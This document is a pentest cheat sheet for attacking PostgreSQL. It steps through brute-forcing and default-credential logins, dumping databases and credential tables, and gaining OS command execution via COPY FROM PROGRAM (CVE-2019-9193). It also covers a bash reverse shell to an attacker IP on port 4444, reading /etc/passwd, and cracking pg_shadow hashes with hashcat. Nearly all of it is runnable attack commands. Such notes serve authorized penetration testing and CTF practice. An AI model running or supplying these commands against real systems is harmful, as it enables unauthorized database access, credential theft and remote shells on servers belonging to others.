## Goal
Log in (found creds or `postgres`), read data, and get RCE via COPY FROM PROGRAM. PostgreSQL(5432) can give command execution as the postgres user.

**Checklist**
- [ ] creds or `postgres` login works?
- [ ] version >= 9.3 (COPY FROM PROGRAM)?
- [ ] read files / dump creds?

# Commands

### Step 1: Connect
```bash
nmap -p5432 --script pgsql-brute $IP
psql -h $IP -U postgres                    # blank password
psql -h $IP -U postgres -W                 # prompt for password
PGPASSWORD='<pass>' psql -h $IP -U <user>  # with a found credential
# try: postgres:postgres, postgres:password, admin:admin
```

common username and password [link](https://github.com/netbiosX/Default-Credentials/blob/master/PostgreSQL-Default-Password-List.md) for postgresql
### Step 2: Loot
```sql
\l                 -- list databases
\c <db>            -- connect
\dt                -- list tables
SELECT * FROM users;
SELECT version();
```

### Step 3: RCE (COPY FROM PROGRAM, v9.3+ CVE-2019-9193)
```sql
DROP TABLE IF EXISTS cmd; CREATE TABLE cmd(o text);
COPY cmd FROM PROGRAM 'id';
SELECT * FROM cmd;
-- reverse shell:
COPY cmd FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1"';
```

### Step 4: File read
```sql
CREATE TABLE f(c text); COPY f FROM '/etc/passwd'; SELECT * FROM f;
```
### Helpline
```bash
# READING RESULTS: psql connects with blank password = no auth -> enumerate + try RCE.
#   current_setting('is_superuser') = on -> COPY FROM PROGRAM gives RCE. off -> can't read files,
#     but still dump tables for creds ("permission denied for pg_read_file" confirms not-superuser).
# THE RCE: COPY cmd FROM PROGRAM 'id' (v9.3+, CVE-2019-9193) as superuser = OS command exec -> reverse shell.
#   file read as superuser: CREATE TABLE f(c text); COPY f FROM '/etc/passwd'; SELECT * FROM f;
# HASHES: pg_shadow shows hashes -> hashcat -m 12 (md5) or -m 28600 (SCRAM).
# LOOT: user/password columns in app tables -> reuse elsewhere. \! id runs a local shell from psql if allowed.
# default creds: postgres:postgres, postgres:(blank).
```
